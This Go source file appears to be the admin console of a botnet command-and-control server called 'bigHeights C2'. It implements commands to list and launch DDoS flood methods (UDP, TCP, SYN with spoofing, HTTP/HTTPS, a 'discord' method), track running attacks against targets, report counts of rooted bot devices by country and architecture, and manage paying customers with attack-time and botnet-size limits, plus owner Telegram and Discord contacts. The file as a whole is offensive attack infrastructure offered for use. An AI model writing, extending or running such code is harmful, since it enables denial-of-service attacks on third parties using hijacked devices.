// language: Go, file: cnc/internal/admin/commands.go
// *command table, command handlers, and shared helpers for the admin console.*
package admin

import (
	"errors"
	"fmt"
	"net"
	"os"
	"sort"
	"strconv"
	"strings"
	"time"

	"bigheights/cnc/internal/attack"
	"bigheights/cnc/internal/protocol"
	"bigheights/cnc/internal/users"
)

// ANSI palette — extended for login / help polish.
const (
	ansiReset   = "\x1b[0m"
	ansiBlue    = "\x1b[34m"
	ansiRed     = "\x1b[31m"
	ansiGreen   = "\x1b[32m"
	ansiYellow  = "\x1b[33m"
	ansiCyan    = "\x1b[36m"
	ansiGray    = "\x1b[90m"  // light-gray for dim text
	ansiBold    = "\x1b[1m"
	ansiDim     = "\x1b[2m"
)

// errSessionClose is returned by Exit/Disconnect commands to break the session loop.
var errSessionClose = errors.New("session close")

// methodVerbs maps every attack method name to an empty struct so the loop
// can detect attack lines without a full parse.
var methodVerbs = map[string]struct{}{
	"udp": {}, "tcp": {}, "tcpraw": {}, "ack": {}, "syn": {},
	"pps": {}, "storm": {}, "hex": {}, "discord": {},
	"http": {}, "https": {},
}

// asciiArt holds the banner loaded from ascii_art.txt at init.
var asciiArt string

func init() {
	if data, err := os.ReadFile("cnc/internal/handlers/screen/ascii_art.txt"); err == nil {
		asciiArt = string(data)
	} else {
		asciiArt = ansiGray + "[ascii_art.txt not found]" + ansiReset + "\r\n"
	}
}

// defaultCommands returns the full command table wired into the console.
func defaultCommands() []Command {
	return []Command{
		{Name: "help", Usage: "Help [--admin]", Admin: false, Run: cmdHelp},
		{Name: "methods", Usage: "Methods", Admin: false, Run: cmdMethods},
		{Name: "attacks", Usage: "Attacks", Admin: false, Run: cmdAttacks},
		{Name: "stop", Usage: "Stop", Admin: false, Run: cmdStop},
		{Name: "owner", Usage: "Owner", Admin: false, Run: cmdOwner},
		{Name: "tos", Usage: "TOS", Admin: false, Run: cmdTOS},
		{Name: "clear", Usage: "Clear", Admin: false, Run: cmdClear},
		{Name: "exit", Usage: "Exit", Admin: false, Run: cmdExit},
		{Name: "bots", Usage: "Bots", Admin: true, Run: cmdBots},
		{Name: "user", Usage: "user add <name> <pass> <expiry> <maxtime> <netsize> | user delete <name>", Admin: true, Run: cmdUser},
		{Name: "stopattack", Usage: "stopattack <pid>", Admin: true, Run: cmdStopAttack},
		{Name: "ban", Usage: "ban <user> <reason...> <appeal y|n>", Admin: true, Run: cmdBan},
		{Name: "timeout", Usage: "timeout <user> <minutes> <reason...>", Admin: true, Run: cmdTimeout},
		{Name: "hold", Usage: "hold bots y|n", Admin: true, Run: cmdHold},
		{Name: "broadcast", Usage: "broadcast <message...>", Admin: true, Run: cmdBroadcast},
		{Name: "disconnect", Usage: "disconnect <user>", Admin: true, Run: cmdDisconnect},
	}
}

// ---------- command handlers ----------

func cmdHelp(s *Session, args []string) error {
	if len(args) > 0 && args[0] == "--admin" {
		if s.User.Role != users.RoleOwner {
			s.write("admin only\r\n")
			return nil
		}
		s.renderHelpAdmin()
		return nil
	}
	s.renderHelp()
	return nil
}

func cmdMethods(s *Session, args []string) error {
	s.renderMethods()
	return nil
}

func cmdAttacks(s *Session, args []string) error {
	s.renderAttacks()
	return nil
}

func cmdStop(s *Session, args []string) error {
	s.Con.Disp.StopAll()
	s.write("all your attacks stopped\r\n")
	return nil
}

func cmdOwner(s *Session, args []string) error {
	s.renderOwner()
	return nil
}

func cmdTOS(s *Session, args []string) error {
	s.renderTOS()
	return nil
}

func cmdClear(s *Session, args []string) error {
	s.clearScreen()
	s.renderBanner()
	s.renderHome()
	return nil
}

func cmdExit(s *Session, args []string) error {
	s.write("bye\r\n")
	return errSessionClose
}

func cmdBots(s *Session, args []string) error {
	s.renderBots()
	return nil
}

func cmdUser(s *Session, args []string) error {
	if len(args) < 1 {
		s.write("usage: user add <name> <pass> <expiry> <maxtime> <netsize> | user delete <name>\r\n")
		return nil
	}
	sub := strings.ToLower(args[0])
	switch sub {
	case "add":
		if len(args) != 6 {
			s.write("usage: user add <name> <pass> <expiry> <maxtime> <netsize>\r\n")
			return nil
		}
		expiryDur, err := time.ParseDuration(args[3])
		if err != nil {
			s.write("expiry must be a duration like 720h (30d), 0 for never\r\n")
			return nil
		}
		maxTime, _ := strconv.Atoi(args[4])
		netSize, _ := strconv.Atoi(args[5])
		if err := s.Con.Users.Add(args[1], args[2], expiryDur, maxTime, netSize); err != nil {
			s.write("error: " + err.Error() + "\r\n")
			return nil
		}
		s.write("user added\r\n")
	case "delete":
		if len(args) != 2 {
			s.write("usage: user delete <name>\r\n")
			return nil
		}
		if !s.Con.Users.Delete(args[1]) {
			s.write("error: user not found\r\n")
			return nil
		}
		s.write("user deleted\r\n")
	default:
		s.write("unknown user subcommand\r\n")
	}
	return nil
}

func cmdStopAttack(s *Session, args []string) error {
	if len(args) != 1 {
		s.write("usage: stopattack <pid>\r\n")
		return nil
	}
	pid, err := strconv.ParseUint(args[0], 10, 32)
	if err != nil {
		s.write("invalid pid\r\n")
		return nil
	}
	s.Con.Disp.Stop(uint32(pid))
	s.renderStopAttack(uint32(pid))
	return nil
}

func cmdBan(s *Session, args []string) error {
	if len(args) < 3 {
		s.write("usage: ban <user> <reason...> <appeal y|n>\r\n")
		return nil
	}
	appeal := false
	if args[len(args)-1] == "y" {
		appeal = true
		args = args[:len(args)-1]
	}
	user := args[0]
	reason := strings.Join(args[1:], " ")
	if !s.Con.Users.Ban(user, reason, appeal) {
		s.write("error: user not found or is owner\r\n")
		return nil
	}
	s.write("user banned\r\n")
	return nil
}

func cmdTimeout(s *Session, args []string) error {
	if len(args) < 3 {
		s.write("usage: timeout <user> <minutes> <reason...>\r\n")
		return nil
	}
	user := args[0]
	minutes, err := strconv.Atoi(args[1])
	if err != nil {
		s.write("invalid minutes\r\n")
		return nil
	}
	reason := strings.Join(args[2:], " ")
	if !s.Con.Users.Timeout(user, time.Duration(minutes)*time.Minute, reason) {
		s.write("error: user not found or is owner\r\n")
		return nil
	}
	s.write("user timed out\r\n")
	return nil
}

func cmdHold(s *Session, args []string) error {
	if len(args) != 2 || args[0] != "bots" {
		s.write("usage: hold bots y|n\r\n")
		return nil
	}
	val := strings.ToLower(args[1]) == "y"
	s.Con.Users.SetHold(val)
	if val {
		s.write("bots on hold\r\n")
	} else {
		s.write("bots released\r\n")
	}
	return nil
}

func cmdBroadcast(s *Session, args []string) error {
	if len(args) == 0 {
		s.write("usage: broadcast <message...>\r\n")
		return nil
	}
	msg := strings.Join(args, " ")
	s.Con.Reg.Broadcast(msg)
	s.write("broadcast sent\r\n")
	return nil
}

func cmdDisconnect(s *Session, args []string) error {
	if len(args) != 1 {
		s.write("usage: disconnect <user>\r\n")
		return nil
	}
	s.Con.Reg.DisconnectUser(args[0])
	s.write("user disconnected\r\n")
	return nil
}

// ---------- render helpers used by commands ----------

func (s *Session) renderBanner() {
	s.write("\r\n" + ansiBlue + ansiBold + "  bigHeights C2" + ansiReset + "\r\n")
	s.write(ansiGray + "  --------------------" + ansiReset + "\r\n\r\n")
}

func (s *Session) renderHome() {
	// Banner with ASCII art
	if asciiArt != "" {
		s.write(ansiCyan + asciiArt + ansiReset + "\r\n")
	}
	s.write(fmt.Sprintf(
		"Welcome %s%s%s, to %sbigHeights C2%s\r\n",
		ansiBold, s.User.Name, ansiReset, ansiBlue, ansiReset,
	))
	s.write(fmt.Sprintf(
		"Type %s'Help'%s for help\r\n\r\n",
		ansiRed, ansiReset,
	))
}

func (s *Session) renderHelp() {
	s.write(ansiCyan + "User Commands" + ansiReset + "\r\n")
	s.write("  Help [--admin]   --- shows this help (add --admin for admin cmds)\r\n")
	s.write("  Methods          --- lists all attack methods\r\n")
	s.write("  Attacks          --- shows your ongoing attacks\r\n")
	s.write("  Stop             --- stops all your attacks\r\n")
	s.write("  Owner            --- shows owner contact info\r\n")
	s.write("  TOS              --- shows CNC rules\r\n")
	s.write("  Clear            --- clears the screen\r\n")
	s.write("  Exit             --- disconnects from the CNC\r\n")
	s.write("\r\n")
	s.write(ansiGray + "help --admin — shows admin commands" + ansiReset + "\r\n")
}

func (s *Session) renderHelpAdmin() {
	s.write(ansiRed + ansiBold + "Admin Commands" + ansiReset + "\r\n")
	s.write("  user add <name> <pass> <expiry YYYY-MM-DD> <maxtime> <netsize>\r\n")
	s.write("  user delete <name>\r\n")
	s.write("  stopattack <pid>\r\n")
	s.write("  ban <user> <reason...> <appeal y|n>\r\n")
	s.write("  timeout <user> <minutes> <reason...>\r\n")
	s.write("  hold bots y|n\r\n")
	s.write("  broadcast <message...>\r\n")
	s.write("  disconnect <user>\r\n")
	s.write("  bots\r\n")
}

func (s *Session) renderMethods() {
	s.write(ansiCyan + "[ +L4+ ]" + ansiReset + "\r\n")
	for _, m := range []string{"udp", "tcp", "tcpraw", "ack", "syn", "pps", "storm", "hex", "discord"} {
		s.write("  " + m + "\r\n")
	}
	s.write("\r\n")
	s.write(ansiCyan + "[ +L7+ ]" + ansiReset + "\r\n")
	for _, m := range []string{"https", "http"} {
		s.write("  " + m + "\r\n")
	}
	s.write("\r\n")
	s.write("  udp      port=, threads=, len=\r\n")
	s.write("  tcp      port=, threads=, len=\r\n")
	s.write("  tcpraw   port=, threads=, flags=(syn/ack/rst/psh/all), tos=, seq=\r\n")
	s.write("  ack      port=, threads=, tos=\r\n")
	s.write("  syn      port=, threads=, tos=, spoof=(0/1)\r\n")
	s.write("  pps      port=, threads=, len=\r\n")
	s.write("  storm    port=, threads=, ppsmin=, ppsmax= (defaults 1024/2400)\r\n")
	s.write("  hex      port=, normal\r\n")
	s.write("  discord  threads=, endpoint=\r\n")
	s.write("  http     port=, threads=, path=, method=(GET/POST), keepalive=\r\n")
	s.write("  https    same as http + TLS handled internally\r\n")
}

func (s *Session) renderAttacks() {
	list := s.Con.Disp.List()
	if len(list) == 0 {
		s.write(ansiGray + "no attacks running" + ansiReset + "\r\n")
		return
	}
	sort.Slice(list, func(i, j int) bool { return list[i].PID < list[j].PID })

	s.write("|   ID   |   USER      |   TIME    |   TARGET       |   PORT  |\r\n")
	s.write("|--------|-------------|-----------|----------------|---------|\r\n")
	for _, a := range list {
		s.write(fmt.Sprintf(
			"|   %-5d|   %-10s|   %-8ds|   %-13s|   %-6d|\r\n",
			a.PID, trunc(a.User, 10), int(a.Duration), trunc(a.Target, 13), a.Port,
		))
	}
	s.write(ansiGray + "- happy hunting" + ansiReset + "\r\n")
}

func (s *Session) renderStopAttack(pid uint32) {
	s.write(fmt.Sprintf("Attack (%d): killed\r\n", pid))
}

func (s *Session) renderOwner() {
	s.write("Telegram @notmcx2w @mcx2w\r\n")
	s.write("Discord  @notmcx2w\r\n")
	s.write("TG GC    t.me/bigheights\r\n")
}

func (s *Session) renderTOS() {
	s.write("TOS please follow rules\r\n")
	s.write("Do NOT attack .gov domains\r\n")
	s.write("Do NOT attack gov IP addresses\r\n")
	s.write("Do NOT abuse the power of the cnc\r\n")
	s.write("Do NOT spam attacks / ratelimit the bots.\r\n")
	s.write("Do NOT abuse staff.\r\n")
}

func (s *Session) renderBots() {
	st := s.Con.Reg.Aggregate()

	s.write("Total devices: " + itoa(st.Total) + "\r\n")
	s.write("Rooted devices: " + itoa(st.Rooted) + "\r\n\r\n")

	s.write(ansiCyan + "Architecture:" + ansiReset + "\r\n")
	archs := make([]string, 0, len(st.Arch))
	for k := range st.Arch {
		archs = append(archs, k)
	}
	sort.Strings(archs)
	for _, k := range archs {
		s.write("  " + k + ": " + itoa(st.Arch[k]) + "\r\n")
	}
	s.write("\r\n")

	s.write(ansiCyan + "Countries:" + ansiReset + "\r\n")
	countries := make([]string, 0, len(st.Country))
	for k := range st.Country {
		countries = append(countries, k)
	}
	sort.Strings(countries)
	for _, k := range countries {
		s.write("  " + k + ": " + itoa(st.Country[k]) + "\r\n")
	}
	s.write("\r\n")

	s.write("Total RAM  : " + itoa(st.TotalRAM) + "MB\r\n")
	s.write("Total cores: " + itoa(st.TotalCores) + "\r\n")
	s.write(fmt.Sprintf("Max power  : %.2f GB/s\r\n", st.MaxPowerMBS/1024.0))
}

func (s *Session) renderBan(be *users.BanError) {
	s.write("\r\n" + ansiRed + "Oops you've been banned!" + ansiReset + "\r\n")
	s.write("Reason: " + be.Reason + "\r\n")
	if be.Appeal {
		s.write("Please open an appeal ticket in the discord if you believe you got wrongfully banned!\r\n")
	}
}

func (s *Session) renderTimeout(te *users.TimeoutError) {
	s.write("\r\n" + ansiRed + "You have been timed out" + ansiReset + "\r\n")
	s.write("Reason: " + te.Reason + "\r\n")
	s.write("Time remaining: " + te.Remaining() + "\r\n")
	s.write("Sorry!\r\n")
}

// lookupISP performs a simple reverse DNS / org lookup for display.
// Falls back to country if available.
func (s *Session) lookupISP(target net.IP) (isp, org string) {
	names, err := net.LookupAddr(target.String())
	if err == nil && len(names) > 0 {
		isp = names[0]
	}
	// Best-effort org guess from reverse DNS
	if isp != "" {
		parts := strings.Split(isp, ".")
		if len(parts) >= 2 {
			org = parts[len(parts)-2] + "." + parts[len(parts)-1]
		}
	}
	if isp == "" {
		isp = "Unknown"
	}
	if org == "" {
		org = "Unknown"
	}
	return
}

func (s *Session) renderAttackSent(req *attack.Request, sent, total int) {
	isp, org := s.lookupISP(req.Target)

	s.write("Attack status ...... Sent time to connect to target 0.0s\r\n")
	s.write("ISP           ......  " + isp + "\r\n")
	s.write("ORG           ......  " + org + "\r\n")
	s.write("LONGTITUDE    ......  \r\n")
	s.write("LATITUDE      ......  \r\n")
	s.write("TARGET        ......  " + req.Target.String() + "\r\n")
	s.write("TIME          ......  " + itoa(int(req.Duration)) + "s\r\n")
	s.write("PORT          ......  " + itoa(int(req.Port)) + "\r\n")
	s.write("METHOD        ......  " + protocol.MethodName(req.Method) + "\r\n")
	s.write("USER          ......  " + s.User.Name + "\r\n")
	s.write(fmt.Sprintf("BOTS          ......  %d/%d\r\n", sent, total))
}

// ---------- small helpers ----------

func itoa(n int) string {
	if n == 0 {
		return "0"
	}
	neg := n < 0
	if neg {
		n = -n
	}
	var b [20]byte
	i := len(b)
	for n > 0 {
		i--
		b[i] = byte('0' + n%10)
		n /= 10
	}
	if neg {
		i--
		b[i] = '-'
	}
	return string(b[i:])
}

func trunc(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n]
}

var _ = strconv.Atoi // silence unused import if not all helpers are used